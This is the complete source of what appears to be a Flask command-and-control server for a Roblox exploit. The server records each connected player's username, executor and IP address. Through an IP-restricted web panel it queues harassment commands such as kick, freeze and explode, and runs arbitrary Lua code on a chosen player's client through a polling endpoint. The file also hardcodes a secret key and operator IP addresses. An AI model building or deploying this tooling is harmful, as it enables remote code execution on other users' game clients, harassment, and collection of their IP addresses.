from flask import Flask, request, jsonify, render_template_string, abort
from flask_socketio import SocketIO
import time
import eventlet
eventlet.monkey_patch()

app = Flask(__name__)
app.config["SECRET_KEY"] = "super_long_random_key_2025_change_me"
socketio = SocketIO(app, cors_allowed_origins="*", async_mode="eventlet")

# CHANGE CES IPs
ALLOWED_IPS = {"37.66.149.36", "91.170.86.224"}

connected_players = {}
pending_commands = {}

def check_ip():
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    if ip and "," in ip: ip = ip.split(",")[0].strip()
    if ip not in ALLOWED_IPS: abort(403)

@app.before_request
def protect_routes():
    if request.path in ["/", "/kick", "/troll", "/execute"]:
        check_ip()

HTML = """<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>ROBLOX PANEL</title>
<script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:linear-gradient(135deg,#0f0c29,#302b63,#24243e);color:#fff;font-family:Arial;min-height:100vh}
.container{max-width:1300px;margin:auto;padding:40px}
h1{text-align:center;color:#00ffaa;font-size:3.5rem;text-shadow:0 0 20px #00ffaa;margin-bottom:30px}
.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(380px,1fr));gap:25px}
.card{background:rgba(20,20,30,0.95);border-radius:15px;padding:25px;box-shadow:0 0 30px rgba(0,255,170,0.3);transition:0.3s}
.card:hover{transform:translateY(-10px);box-shadow:0 0 40px rgba(0,255,170,0.6)}
.category{color:#00ffaa;font-weight:bold;margin:15px 0 10px}
button{padding:14px;border:none;border-radius:12px;font-weight:bold;cursor:pointer;margin:5px 0;transition:0.2s}
button:hover{transform:scale(1.05)}
.modal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.9);justify-content:center;align-items:center;z-index:999}
.modal.active{display:flex}
.modal-content{background:#111;padding:30px;border-radius:20px;width:90%;max-width:700px}
textarea{width:100%;height:300px;background:#222;color:#0f0;border-radius:10px;padding:15px;font-family:Consolas;font-size:16px}
</style>
</head>
<body>
<div class="container">
<h1>ROBLOX CONTROL PANEL</h1>
<div class="grid" id="players"></div>
</div>

<!-- Executor Modal -->
<div class="modal" id="executorModal">
    <div class="modal-content">
        <h2 style="color:#00ffaa;text-align:center">LUA EXECUTOR</h2>
        <textarea id="luaCode" placeholder="Tape ton code ici..."></textarea>
        <div style="text-align:center;margin-top:20px">
            <button style="background:#00aa00;padding:15px 40px;font-size:18px" onclick="executeCode()">EXECUTE</button>
            <button style="background:#aa0000;padding:15px 40px;font-size:18px" onclick="closeExecutor()">FERMER</button>
        </div>
    </div>
</div>

<script>
const socket = io();
let targetId = null;

function openExecutor(id) {
    targetId = id;
    document.getElementById("executorModal").classList.add("active");
    document.getElementById("luaCode").focus();
}

function closeExecutor() {
    document.getElementById("executorModal").classList.remove("active");
    document.getElementById("luaCode").value = "";
}

function executeCode() {
    const code = document.getElementById("luaCode").value;
    if (!code.trim()) return;
    fetch("/execute", {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({userid: targetId, code: code})
    });
    alert("Code exécuté sur " + targetId);
    closeExecutor();
}

function sendCmd(id, cmd) {
    fetch("/troll", {method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({userid:id,cmd:cmd})});
}

socket.on("update", d => {
    const grid = document.getElementById("players");
    grid.innerHTML = "";
    Object.entries(d.players).forEach(([id, p]) => {
        const card = document.createElement("div");
        card.className = "card";
        card.innerHTML = `
            <h3><a href="https://roblox.com/users/${id}/profile" target="_blank" style="color:#ffcc00">${p.username}</a> (${id})</h3>
            <p>Executor: ${p.executor} | IP: ${p.ip}</p>
            <div class="category">TROLLS</div>
            <button style="background:#ff3366" onclick="sendCmd('${id}','kick')">KICK</button>
            <button style="background:#aa00aa" onclick="sendCmd('${id}','freeze')">FREEZE</button>
            <button style="background:#00aaaa" onclick="sendCmd('${id}','spin')">SPIN</button>
            <button style="background:#aaaa00" onclick="sendCmd('${id}','jump')">JUMP</button>
            <button style="background:#00aa00" onclick="sendCmd('${id}','rainbow')">RAINBOW</button>
            <button style="background:#aa0000" onclick="sendCmd('${id}','explode')">EXPLODE</button>
            <button style="background:#0000aa" onclick="sendCmd('${id}','invisible')">INVISIBLE</button>

            <div class="category">LUA EXECUTOR</div>
            <button style="background:linear-gradient(45deg,#ff00ff,#00ffff);font-size:20px;padding:20px;width:100%" onclick="openExecutor('${id}')">
                EXECUTER DU LUA
            </button>

            <div class="category">UNDO</div>
            <button style="background:#666" onclick="sendCmd('${id}','unfreeze')">UNFREEZE</button>
            <button style="background:#666" onclick="sendCmd('${id}','unspin')">UNSPIN</button>
            <button style="background:#666" onclick="sendCmd('${id}','unrainbow')">UNRAINBOW</button>
        `;
        grid.appendChild(card);
    });
});
</script>
</body>
</html>"""

@app.route("/")
def index(): return render_template_string(HTML)

@app.route("/api", methods=["GET","POST"])
def api():
    if request.method == "POST":
        d = request.get_json(silent=True) or {}
        uid = str(d.get("userid",""))
        action = d.get("action")
        if action == "register" and uid:
            connected_players[uid] = {"username":d.get("username","?"),"executor":d.get("executor","?"),"ip":d.get("ip","?"),"last":time.time()}
        elif action == "heartbeat" and uid in connected_players:
            connected_players[uid]["last"] = time.time()
        return jsonify({"ok":True})
    else:
        uid = request.args.get("userid","")
        if uid in pending_commands:
            cmd = pending_commands.pop(uid)
            return jsonify(cmd)
        return jsonify({})

@app.route("/troll", methods=["POST"])
def troll():
    check_ip()
    data = request.get_json() or {}
    uid = str(data.get("userid",""))
    cmd = data.get("cmd","")
    if uid and cmd: pending_commands[uid] = {"command": cmd}
    return jsonify({"ok":True})

@app.route("/execute", methods=["POST"])
def execute():
    check_ip()
    data = request.get_json() or {}
    uid = str(data.get("userid",""))
    code = data.get("code","")
    if uid and code:
        pending_commands[uid] = {"command": "run_code", "code": code}
    return jsonify({"ok":True})

def broadcast():
    while True:
        now = time.time()
        online = sum(1 for p in connected_players.values() if now - p["last"] < 15)
        socketio.emit("update", {"players": connected_players, "online": online, "total": len(connected_players)})
        socketio.sleep(2)

if __name__ == "__main__":
    socketio.start_background_task(broadcast)
    socketio.run(app, host="0.0.0.0", port=5000)
